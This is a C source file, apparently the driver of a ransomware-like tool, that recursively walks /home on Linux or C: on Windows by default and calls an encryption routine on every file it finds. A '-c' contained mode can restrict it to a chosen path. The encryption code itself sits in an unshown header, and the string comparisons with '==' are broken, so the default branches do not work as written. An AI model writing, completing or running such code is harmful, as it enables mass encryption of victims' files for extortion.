#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <dirent.h>
#include "encrypt_dependencies.h"

#ifdef __linux__
    char os[] = "linux";
#elif _WIN32
    char os[] = "win";
#endif

void go_through_files(char* encryption_path, int verbose);

int main(int argc, char* argv[]) {
    // args handling
    int contained_mode = 0;
    int verbose = 0;
    char* encryption_path;

    printf("=== Encryption ===\n");

    for (int i = 0; i < argc; i++)
    {
        if (strcmp(argv[i], "-c") == 0) {
            printf("Contained mode \n");
            contained_mode = 1;
        }

        if (strcmp(argv[i], "-v") == 0) {
            printf("Verbose mode \n");
            verbose = 1;
        }
    }

    printf("\nPress enter to continue...");
    scanf("%*c");

    if (contained_mode) {
        encryption_path = malloc(strlen(argv[argc-1]) + 2);

        if (encryption_path == NULL)
            return 1;
        
        strcpy(encryption_path, argv[argc-1]);
    }
    else {
        if (os == "linux") {
            encryption_path = malloc(strlen("/home") + 1);

            if (encryption_path == NULL)
                return 1;
            strcpy(encryption_path, "/home");
        } 
        else if (os == "win") {
            encryption_path = malloc(strlen("C:") + 1);

            if (encryption_path == NULL)
                return 1;
            strcpy(encryption_path, "C:");
        }
    }

    // Encryption process
    go_through_files(encryption_path, verbose);

    return 0;
}

void go_through_files(char* encryption_path, int verbose) {
    DIR* encrypt_dir;
    struct dirent* entry;

    encrypt_dir = opendir(encryption_path);

    if (encrypt_dir == NULL) {
        perror("Could not open folder");
        return;
    }

    while (1) {
        char* file_path;

        entry = readdir(encrypt_dir);

        if (entry == NULL) break;
        else if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;
        
        file_path = malloc(strlen(encryption_path) + strlen(entry->d_name) + 2);

        if (file_path == NULL) {
            perror("file_path malloc()");
            continue;
        }
        strcpy(file_path, encryption_path);
        strcat(file_path, "/");
        char* ptr = strcat(file_path, entry->d_name);

        if (opendir(file_path) == NULL) {
            if (verbose) printf("Found %s\n", file_path);
            encryption(file_path, verbose);
        } 
        else go_through_files(file_path, verbose);
        free(file_path);
    }
    closedir(encrypt_dir);
}